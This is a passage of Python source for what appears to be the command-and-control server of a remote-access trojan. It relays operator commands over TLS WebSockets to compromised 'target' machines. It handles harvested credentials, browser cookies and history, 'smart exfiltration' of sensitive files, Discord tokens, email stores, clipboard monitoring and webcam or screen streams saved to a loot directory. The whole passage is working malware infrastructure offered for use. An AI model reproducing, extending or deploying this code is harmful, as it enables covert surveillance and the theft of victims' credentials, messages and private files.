                                    await ws_from.send(f"[✗] {error_msg}")
                            
                            except asyncio.TimeoutError:
                                await ws_from.send(f"[✗] Timeout harvesting credentials")
                            finally:
                                pending_file_responses.pop(request_id, None)
                        
                        # ======== NEW FEATURE HANDLERS ========
                        
                        # Handler BROWSER_DEBUG (Diagnostic)
                        elif message == "BROWSER_DEBUG":
                            request_id = str(time.time())
                            pending_file_responses[request_id] = {
                                'event': asyncio.Event(),
                                'response': None
                            }
                            
                            await ws_to.send(message)
                            print(f"[BROWSER] Getting debug info from {target_id}")
                            
                            try:
                                await asyncio.wait_for(
                                    pending_file_responses[request_id]['event'].wait(),
                                    timeout=10.0
                                )
                                
                                response = pending_file_responses[request_id]['response']
                                
                                if response.startswith("BROWSER_DEBUG_DATA:"):
                                    json_data = response.split(":", 1)[1]
                                    
                                    import json
                                    data = json.loads(json_data)
                                    
                                    output = f"[✓] Browser Debug Information\n\n"
                                    output += f"OS: {data.get('os', 'Unknown')}\n"
                                    output += f"Temp Dir: {data.get('temp_dir', 'Unknown')}\n\n"
                                    
                                    if 'browsers' in data:
                                        output += "Browser Paths:\n"
                                        for name, info in data['browsers'].items():
                                            output += f"\n{name}:\n"
                                            output += f"  Path: {info['path']}\n"
                                            output += f"  Exists: {info['exists']}\n"
                                            if info['exists']:
                                                output += f"  Type: {'File' if info['is_file'] else 'Directory' if info['is_dir'] else 'Unknown'}\n"
                                                if info['size_kb'] > 0:
                                                    output += f"  Size: {info['size_kb']} KB\n"
                                    
                                    await ws_from.send(output)
                                
                                elif response.startswith("BROWSER_ERROR:"):
                                    error_msg = response.split(":", 1)[1]
                                    print(f"[BROWSER] Error from {target_id}: {error_msg}")
                                    await ws_from.send(f"[✗] {error_msg}")
                            
                            except asyncio.TimeoutError:
                                await ws_from.send(f"[✗] Timeout getting debug info")
                            finally:
                                pending_file_responses.pop(request_id, None)
                        
                        # Handler BROWSER_DATA (Feature 6: Browser History & Cookies)
                        elif message.startswith("BROWSER_DATA:"):
                            request_id = str(time.time())
                            pending_file_responses[request_id] = {
                                'event': asyncio.Event(),
                                'response': None
                            }
                            
                            await ws_to.send(message)
                            data_type = message.split(":", 1)[1]
                            print(f"[BROWSER] Extracting {data_type} from {target_id}")
                            
                            try:
                                await asyncio.wait_for(
                                    pending_file_responses[request_id]['event'].wait(),
                                    timeout=60.0
                                )
                                
                                response = pending_file_responses[request_id]['response']
                                
                                if response.startswith("BROWSER_DATA:"):
                                    parts = response.split(":", 2)
                                    if len(parts) == 3:
                                        _, data_type, json_data = parts
                                        
                                        import json
                                        data = json.loads(json_data)
                                        
                                        # Check if data was saved to file
                                        if '_saved_file' in data:
                                            # File save mode - only show file info, skip listing
                                            file_info = data['_saved_file']
                                            output = f"[✓] Browser {data_type.upper()} - Complete Data Saved to File\n\n"
                                            output += f"╔═══════════════════════════════════════════════════════╗\n"
                                            output += f"║  FILE SAVED SUCCESSFULLY                              ║\n"
                                            output += f"╚═══════════════════════════════════════════════════════╝\n\n"
                                            output += f"Filename: {file_info['filename']}\n"
                                            output += f"Location: {file_info['path']}\n"
                                            output += f"Size: {file_info['size_kb']} KB\n"
                                            output += f"Total Entries: {file_info['entries']}\n\n"
                                            output += f"💡 Download this file with:\n"
                                            output += f"   >>> download {file_info['path']}\n"
                                            
                                            await ws_from.send(output)
                                        else:
                                            # Normal mode - show listing
                                            output = f"[✓] Browser {data_type.upper()} Extraction\n\n"
                                            
                                            # Show first 50 entries inline
                                            for browser, info in data.items():
                                                if browser.startswith('_'):  # Skip metadata fields
                                                    continue
                                                    
                                                output += f"═══ {browser.upper()} ═══\n"
                                                if 'count' in info:
                                                    output += f"Entries Found: {info['count']}\n"
                                                
                                                if 'data' in info and info['data']:
                                                    output += "\n"
                                                    for i, item in enumerate(info['data'][:50], 1):  # Show first 50
                                                        if data_type == 'history':
                                                            output += f"{i}. {item.get('title', 'No title')}\n"
                                                            output += f"   URL: {item.get('url', 'N/A')}\n"
                                                            output += f"   Visits: {item.get('visit_count', 0)}, Last: {item.get('date', 'Unknown')}\n\n"
                                                        elif data_type == 'cookies':
                                                            output += f"{i}. {item.get('host', 'N/A')} - {item.get('name', 'N/A')}\n"
                                                        elif data_type == 'bookmarks':
                                                            output += f"{i}. {item.get('name', 'No name')}\n"
                                                            output += f"   {item.get('url', 'N/A')}\n\n"
                                                        elif data_type == 'downloads':
                                                            output += f"{i}. {item.get('file', 'N/A')}\n"
                                                            output += f"   From: {item.get('url', 'N/A')}\n"
                                                            output += f"   Date: {item.get('date', 'Unknown')}\n\n"
                                                    
                                                    if info['count'] > 50:
                                                        output += f"... and {info['count'] - 50} more entries\n"
                                                        if data_type in ['history', 'bookmarks', 'downloads']:
                                                            output += f"💡 Use 'browser {data_type} --save' to save all entries to a file\n"
                                                elif 'note' in info:
                                                    output += f"{info['note']}\n"
                                                    if 'debug_path' in info:
                                                        output += f"  Path checked: {info['debug_path']}\n"
                                                        output += f"  Path exists: {info.get('path_exists', False)}\n"
                                                    
                                                    # Show specific error messages
                                                    if 'access_error' in info:
                                                        output += f"  ⚠️  {info['access_error']}\n"
                                                    if 'db_error' in info:
                                                        output += f"  ⚠️  {info['db_error']}\n"
                                                    if 'extract_error' in info:
                                                        output += f"  ⚠️  {info['extract_error']}\n"
                                                    if 'cookie_error' in info:
                                                        output += f"  ⚠️  {info['cookie_error']}\n"
                                                    if 'bookmark_error' in info:
                                                        output += f"  ⚠️  {info['bookmark_error']}\n"
                                                        
                                                elif 'error' in info:
                                                    output += f"Error: {info['error']}\n"
                                                    if 'traceback' in info:
                                                        output += f"Details: {info['traceback']}\n"
                                                
                                                output += "\n"
                                            
                                            await ws_from.send(output)
                                
                                elif response.startswith("BROWSER_ERROR:"):
                                    error_msg = response.split(":", 1)[1]
                                    print(f"[BROWSER] Error from {target_id}: {error_msg}")
                                    await ws_from.send(f"[✗] {error_msg}")
                            
                            except asyncio.TimeoutError:
                                await ws_from.send(f"[✗] Timeout extracting browser data")
                            finally:
                                pending_file_responses.pop(request_id, None)
                        
                        # Handler EXFIL (Feature 7: Smart File Exfiltration)
                        elif message.startswith("EXFIL:"):
                            request_id = str(time.time())
                            pending_file_responses[request_id] = {
                                'event': asyncio.Event(),
                                'response': None
                            }
                            
                            await ws_to.send(message)
                            mode = message.split(":", 1)[1].split(":")[0]
                            print(f"[EXFIL] Smart exfiltration mode: {mode} on {target_id}")
                            
                            try:
                                await asyncio.wait_for(
                                    pending_file_responses[request_id]['event'].wait(),
                                    timeout=120.0  # Longer timeout for file searches
                                )
                                
                                response = pending_file_responses[request_id]['response']
                                
                                if response.startswith("EXFIL_DATA:"):
                                    parts = response.split(":", 2)
                                    if len(parts) == 3:
                                        _, mode, json_data = parts
                                        
                                        import json
                                        data = json.loads(json_data)
                                        
                                        output = f"[✓] Smart Exfiltration - {mode.upper()}\n\n"
                                        
                                        if mode == 'auto':
                                            if 'found_files' in data:
                                                output += f"Sensitive Files Found: {data['count']}\n\n"
                                                for i, file in enumerate(data['found_files'], 1):
                                                    size_kb = file.get('size', 0) / 1024
                                                    output += f"{i}. {file['filename']}\n"
                                                    output += f"   Path: {file['path']}\n"
                                                    output += f"   Size: {size_kb:.2f} KB\n"
                                                    output += f"   Matched: {file['pattern_matched']}\n\n"
                                                
                                                if 'note' in data:
                                                    output += f"\n{data['note']}\n"
                                        
                                        elif mode == 'patterns':
                                            if 'matches' in data:
                                                output += f"Pattern Matches Found: {data['pattern_count']} types\n\n"
                                                for pattern, matches in data['matches'].items():
                                                    output += f"═══ {pattern.upper()} ═══\n"
                                                    for match in matches[:10]:  # First 10 per pattern
                                                        output += f"File: {match['file']}\n"
                                                        output += f"Count: {match['count']}\n"
                                                        if 'samples' in match:
                                                            output += f"Samples: {', '.join(str(s) for s in match['samples'][:3])}\n"
                                                        output += "\n"
                                        
                                        elif mode == 'compress':
                                            if 'zip_file' in data:
                                                size_mb = data['zip_size'] / (1024 * 1024)
                                                output += f"Archive Created: {data['zip_name']}\n"
                                                output += f"Location: {data['zip_file']}\n"
                                                output += f"Size: {size_mb:.2f} MB\n"
                                                output += f"Files Compressed: {data['files_compressed']}\n\n"
                                                output += f"{data.get('note', '')}\n"
                                        
                                        await ws_from.send(output)
                                
                                elif response.startswith("EXFIL_ERROR:"):
                                    error_msg = response.split(":", 1)[1]
                                    print(f"[EXFIL] Error from {target_id}: {error_msg}")
                                    await ws_from.send(f"[✗] {error_msg}")
                            
                            except asyncio.TimeoutError:
                                await ws_from.send(f"[✗] Timeout during smart exfiltration")
                            finally:
                                pending_file_responses.pop(request_id, None)
                        
                        # Handler MSG (Feature 9: Email & Messaging Access)
                        elif message.startswith("MSG:"):
                            request_id = str(time.time())
                            pending_file_responses[request_id] = {
                                'event': asyncio.Event(),
                                'response': None
                            }
                            
                            await ws_to.send(message)
                            msg_type = message.split(":", 1)[1]
                            print(f"[MSG] Extracting {msg_type} from {target_id}")
                            
                            try:
                                await asyncio.wait_for(
                                    pending_file_responses[request_id]['event'].wait(),
                                    timeout=60.0
                                )
                                
                                response = pending_file_responses[request_id]['response']
                                
                                if response.startswith("MSG_DATA:"):
                                    parts = response.split(":", 2)
                                    if len(parts) == 3:
                                        _, msg_type, json_data = parts
                                        
                                        import json
                                        data = json.loads(json_data)
                                        
                                        output = f"[✓] Message Extraction - {msg_type.upper()}\n\n"
                                        
                                        if msg_type == 'email_list':
                                            if 'email_clients' in data:
                                                for client, info in data['email_clients'].items():
                                                    output += f"═══ {client.upper()} ═══\n"
                                                    if info.get('found'):
                                                        output += "Status: Found\n"
                                                        
                                                        # Show path if available
                                                        if 'path' in info:
                                                            output += f"Path: {info['path']}\n"
                                                        
                                                        # Show data files
                                                        if 'data_files' in info:
                                                            if info['data_files']:
                                                                output += "\nData Files:\n"
                                                                for file in info['data_files']:
                                                                    output += f"  📁 {file}\n"
                                                                output += f"\n💡 Download with:\n"
                                                                output += f"   >>> download \"{info['data_files'][0]}\"\n"
                                                            else:
                                                                output += "Data Files: None found\n"
                                                        
                                                        if 'profiles' in info:
                                                            output += f"Profiles: {', '.join(info['profiles'])}\n"
                                                        if 'location' in info:
                                                            output += f"Location: {info['location']}\n"
                                                        if 'note' in info:
                                                            output += f"Note: {info['note']}\n"
                                                    else:
                                                        output += "Status: Not Found\n"
                                                    output += "\n"
                                        
                                        elif msg_type == 'email_thunderbird':
                                            if 'mail_folders' in data:
                                                output += f"Mail Folders Found: {data['count']}\n\n"
                                                for folder in data['mail_folders']:
                                                    size_kb = folder['size'] / 1024
                                                    output += f"- {folder['folder']} ({size_kb:.2f} KB)\n"
                                                    output += f"  {folder['path']}\n\n"
                                                
                                                if 'note' in data:
                                                    output += f"\n{data['note']}\n"
                                            elif 'error' in data:
                                                output += f"Error: {data['error']}\n"
                                        
                                        elif msg_type == 'discord':
                                            if 'discord' in data:
                                                output += f"Tokens Found: {data['discord']['tokens_found']}\n\n"
                                                if data['discord']['tokens']:
                                                    output += "Tokens:\n"
                                                    for token in data['discord']['tokens']:
                                                        output += f"  {token}\n"
                                                output += f"\n{data['discord']['note']}\n"
                                        
                                        elif msg_type == 'slack':
                                            if 'slack' in data:
                                                output += f"Workspaces Found: {data['slack']['workspaces_found']}\n\n"
                                                if 'data_locations' in data['slack']:
                                                    for location in data['slack']['data_locations']:
                                                        output += f"Location: {location['path']}\n"
                                                        output += f"Note: {location['note']}\n\n"
                                        
                                        elif msg_type == 'windows_mail_export':
                                            if 'error' in data:
                                                output += f"Error: {data['error']}\n"
                                                if 'note' in data:
                                                    output += f"Note: {data['note']}\n"
                                                if 'path' in data:
                                                    output += f"Path checked: {data['path']}\n"
                                            elif data.get('success'):
                                                output += "╔════════════════════════════════════════════════════╗\n"
                                                output += "║  WINDOWS MAIL DATABASE EXPORTED                    ║\n"
                                                output += "╚════════════════════════════════════════════════════╝\n\n"
                                                
                                                # Show method used
                                                if data.get('method'):
                                                    output += f"Method: {data['method']}\n"
                                                
                                                output += f"Filename: {data['filename']}\n"
                                                output += f"Location: {data['zip_file']}\n"
                                                output += f"Files Archived: {data['files_archived']}\n"
                                                output += f"Original Size: {data['original_size_mb']} MB\n"
                                                output += f"ZIP Size: {data['zip_size_mb']} MB\n"
                                                output += f"Compression: {data['compression_ratio']}%\n\n"
                                                
                                                output += f"💡 Download with:\n"
                                                output += f"   >>> download {data['filename']}\n\n"
                                                output += "📖 To read emails:\n"
                                                output += "   1. Download ESEDatabaseView from nirsoft.net\n"
                                                output += "   2. Extract the ZIP file\n"
                                                output += "   3. Open store.vol with ESEDatabaseView\n"
                                                output += "   4. Browse tables: Message, Folder, Contact\n"
                                        
                                        await ws_from.send(output)
                                
                                elif response.startswith("MSG_ERROR:"):
                                    error_msg = response.split(":", 1)[1]
                                    print(f"[MSG] Error from {target_id}: {error_msg}")
                                    await ws_from.send(f"[✗] {error_msg}")
                            
                            except asyncio.TimeoutError:
                                await ws_from.send(f"[✗] Timeout extracting message data")
                            finally:
                                pending_file_responses.pop(request_id, None)
                        
                        # Handler SHELL_UPGRADE (Feature 10: Remote Shell Upgrading)
                        elif message.startswith("SHELL_UPGRADE:"):
                            request_id = str(time.time())
                            pending_file_responses[request_id] = {
                                'event': asyncio.Event(),
                                'response': None
                            }
                            
                            await ws_to.send(message)
                            shell_type = message.split(":", 1)[1]
                            print(f"[SHELL] Checking upgrade to {shell_type} on {target_id}")
                            
                            try:
                                await asyncio.wait_for(
                                    pending_file_responses[request_id]['event'].wait(),
                                    timeout=10.0
                                )
                                
                                response = pending_file_responses[request_id]['response']
                                
                                if response.startswith("SHELL_UPGRADE:"):
                                    parts = response.split(":", 2)
                                    if len(parts) == 3:
                                        _, shell_type, status = parts
                                        output = f"[✓] Shell Upgrade Check - {shell_type.upper()}\n\n{status}\n"
                                        await ws_from.send(output)
                                
                                elif response.startswith("SHELL_ERROR:"):
                                    error_msg = response.split(":", 1)[1]
                                    print(f"[SHELL] Error from {target_id}: {error_msg}")
                                    await ws_from.send(f"[✗] {error_msg}")
                            
                            except asyncio.TimeoutError:
                                await ws_from.send(f"[✗] Timeout checking shell upgrade")
                            finally:
                                pending_file_responses.pop(request_id, None)
                        
                        else:
                            # Standard command - relay
                            await ws_to.send(message)
                
                except websockets.exceptions.ConnectionClosed:
                    print(f"[INFO] {name} relay closed")
                except asyncio.CancelledError:
                    print(f"[INFO] {name} relay cancelled")
                    raise  # Important: Re-raise so that the task can be resolved properly
                except Exception as e:
                    print(f"[RELAY ERROR {name}] {e}")
            
            async def relay_target_to_operator(ws_from, ws_to, name):
                """Relay target → operator and capture FILE_ responses"""
                try:
                    async for message in ws_from:
                        # Handle clipboard monitor and history updates (stream directly to operator)
                        if message.startswith("CLIPBOARD_MONITOR_") or message.startswith("CLIPBOARD_HISTORY_"):
                            if message.startswith("CLIPBOARD_MONITOR_START:"):
                                duration = message.split(":", 1)[1]
                                await ws_to.send(f"[+] Monitoring clipboard... (duration: {duration}s)")
                            
                            elif message.startswith("CLIPBOARD_MONITOR_UPDATE:"):
                                # Format: CLIPBOARD_MONITOR_UPDATE:timestamp:b64_content
                                # Timestamp format: YYYY-MM-DD HH:MM:SS (contains colons!)
                                import base64
                                try:
                                    # Remove prefix first
                                    data = message[len("CLIPBOARD_MONITOR_UPDATE:"):]
                                    
                                    # Timestamp is first 19 characters: "2026-04-04 02:13:16"
                                    # Then comes ":" and base64 content
                                    if len(data) > 20:
                                        timestamp = data[:19]  # "2026-04-04 02:13:16"
                                        b64_content = data[20:]  # Skip timestamp + ":"
                                        
                                        # Try to decode with error handling
                                        try:
                                            decoded_bytes = base64.b64decode(b64_content)
                                            content = decoded_bytes.decode('utf-8')
                                        except UnicodeDecodeError:
                                            # Try with error replacement
                                            try:
                                                content = decoded_bytes.decode('utf-8', errors='replace')
                                            except:
                                                # Last resort: show as latin-1
                                                content = decoded_bytes.decode('latin-1', errors='ignore')
                                        
                                        await ws_to.send(f"[{timestamp}] Copied: {content}")
                                except Exception as e:
                                    print(f"[CLIPBOARD_MONITOR] Decode error: {e}")
                                    # Continue processing, don't crash
                            
                            elif message.startswith("CLIPBOARD_MONITOR_STOP:"):
                                msg = message.split(":", 1)[1]
                                await ws_to.send(f"[+] {msg}")
                            
                            elif message.startswith("CLIPBOARD_MONITOR_ERROR:"):
                                error = message.split(":", 1)[1]
                                await ws_to.send(f"[✗] {error}")
                            
                            elif message.startswith("CLIPBOARD_HISTORY_"):
                                # Just relay history messages directly
                                await ws_to.send(message)
                            
                            # Don't wait for pending response, stream directly
                            continue
                        
                        # Check if this is a response to an FILE_, WEBCAM, AUDIO, SEARCH, SYSINFO, CLIPBOARD, CREDS, BROWSER, EXFIL, MSG or SHELL command
                        if message.startswith((
                            "FILE_DATA:", "FILE_ERROR:", "FILE_OK:", 
                            "WEBCAM_DATA:", "WEBCAM_ERROR:", 
                            "SCREENSHOT_DATA:", "SCREENSHOT_ERROR:",
                            "STREAM_STARTED:", "STREAM_STOPPED:", "STREAM_ERROR:",
                            "AUDIO_DATA:", "AUDIO_ERROR:",
                            "SEARCH_RESULTS:", "SEARCH_ERROR:",
                            "SYSINFO_DATA:", "SYSINFO_ERROR:",
                            "CLIPBOARD_DATA:", "CLIPBOARD_OK:", "CLIPBOARD_ERROR:",
                            "CREDS_DATA:", "CREDS_ERROR:",
                            "BROWSER_DATA:", "BROWSER_ERROR:", "BROWSER_DEBUG_DATA:",
                            "EXFIL_DATA:", "EXFIL_ERROR:",
                            "MSG_DATA:", "MSG_ERROR:",
                            "SHELL_UPGRADE:", "SHELL_ERROR:",
                            "LIST_DOWNLOADS_OK:", "LIST_DOWNLOADS_ERROR:"
                        )):
                            # Find the pending request
                            handled = False
                            for request_id, data in pending_file_responses.items():
                                if data['response'] is None:  # Première réponse non traitée
                                    data['response'] = message
                                    data['event'].set()
                                    handled = True
                                    break
                            
                            # If there are no pending requests, this may be a residual message
                            # We ignore (do not pass this on to the operator)
                        
                        # Handle streaming frames separately (continuous, not request/response)
                        elif message.startswith("STREAM_FRAME:"):
                            # Format: STREAM_FRAME:frame_number:base64_data
                            try:
                                parts = message.split(":", 2)
                                if len(parts) == 3:
                                    _, frame_num, b64_data = parts
                                    
                                    import base64
                                    from pathlib import Path
                                    from datetime import datetime
                                    
                                    image_data = base64.b64decode(b64_data)
                                    
                                    # Save frame to loot directory
                                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                                    safe_filename = f"{target_id}_stream_frame_{frame_num}.jpg"
                                    filepath = Path(LOOT_DIR) / safe_filename
                                    
                                    with open(filepath, 'wb') as f:
                                        f.write(image_data)
                                    
                                    size_kb = len(image_data) / 1024
                                    
                                    # Send notification to operator (every 10 frames to avoid spam)
                                    if int(frame_num) % 10 == 0:
                                        await ws_to.send(f"[STREAM] Frame {frame_num} ({size_kb:.1f} KB) → {filepath}")
                                    
                                    print(f"[STREAM] Frame {frame_num} from {target_id} ({size_kb:.1f} KB)")
                            except Exception as e:
                                print(f"[STREAM] Error processing frame: {e}")
                        
                        else:
                            # Standard message - forward to the operator
                            await ws_to.send(message)
                
                except websockets.exceptions.ConnectionClosed:
                    print(f"[INFO] {name} relay closed")
                except asyncio.CancelledError:
                    print(f"[INFO] {name} relay cancelled")
                    raise  # Important: Re-raise the issue so that the task can be resolved properly
                except Exception as e:
                    print(f"[RELAY ERROR {name}] {e}")
            
            # Bidirectional relay
            relay_tasks = [
                asyncio.create_task(relay_operator_to_target(websocket, target_ws, f"op({login})->target({target_id})")),
                asyncio.create_task(relay_target_to_operator(target_ws, websocket, f"target({target_id})->op({login})"))
            ]
            
            # Save tasks so they can be cancelled later
            active_relays[target_id] = relay_tasks
            
            await asyncio.gather(*relay_tasks, return_exceptions=True)
            
            # Clean after disconnecting
            active_relays.pop(target_id, None)
            
            print(f"[-] Operator {login} disconnected from target {target_id}")
        
        else:
            await websocket.send(f"Unknown role: {role}")
    
    except asyncio.TimeoutError:
        print(f"[!] Timeout from {client_addr}")
        try:
            await websocket.send("Timeout")
        except:
            pass
    except Exception as e:
        print(f"[SERVER ERROR] {e}")

async def start_server(host: str, port: int, certfile: str):
    """Starting the WebSocket server"""
    ensure_directories()
    
    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ssl_context.load_cert_chain(certfile, certfile)
    
    async with websockets.serve(
        handler,
        host,
        port,
        ssl=ssl_context,
        ping_interval=None,
        max_size=10_000_000  # 10MB max for files
    ):
        print(f"[+] Server running on wss://{host}:{port}")
        print(f"[+] Credentials file: {CREDS_FILE}")
        print(f"[+] Loot directory: {LOOT_DIR}/")
        print(f"[+] Payloads directory: {PAYLOADS_DIR}/")
        await asyncio.Future()

def main():
    parser = argparse.ArgumentParser(description="WebSocket Relay Server with File Transfer")
    parser.add_argument('-creds', nargs=3, metavar=('ROLE', 'LOGIN', 'PASSWORD'),
                       help='Add credentials: -creds operator admin MySecurePass123')
    parser.add_argument('-host', default='0.0.0.0', help='Server host (default: 0.0.0.0)')
    parser.add_argument('-port', type=int, default=8765, help='Server port (default: 8765)')
    parser.add_argument('-cert', default='server.pem', help='SSL certificate file (default: server.pem)')
    
    args = parser.parse_args()
    
    if args.creds:
        role, login, password = args.creds
        
        if role not in ['operator', 'target']:
            print("[ERROR] Role must be 'operator' or 'target'")
            sys.exit(1)
        
        add_credential(role, login, password)
        sys.exit(0)
    
    if not Path(args.cert).exists():
        print(f"[ERROR] Certificate file not found: {args.cert}")
        print("Generate one with: openssl req -x509 -newkey rsa:4096 -nodes -out server.pem -keyout server.pem -days 365")
        sys.exit(1)
    
    creds = load_credentials()
    if not creds:
        print("[WARNING] No credentials configured!")
        print("Add credentials with: python server_files.py -creds operator admin password123")
    
    asyncio.run(start_server(args.host, args.port, args.cert))

if __name__ == "__main__":
    main()